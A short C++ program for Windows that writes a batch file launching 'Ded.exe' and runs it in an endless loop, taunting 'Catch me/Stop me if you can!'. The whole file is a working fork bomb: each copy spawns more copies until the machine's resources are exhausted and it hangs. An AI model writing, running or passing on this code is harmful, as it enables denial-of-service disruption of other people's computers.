#include <iostream>
#include <fstream>
#include <windows.h>

int main()
{
	std::ofstream payload;
	payload.open("ded.bat");
	payload << "start Ded.exe" << std::endl;
	payload.close();

	while (true) {
		std::cout << "I'm Ded. Catch me/Stop me if you can!" << std::endl;
		system("ded.bat");
	}
	return 0;
}
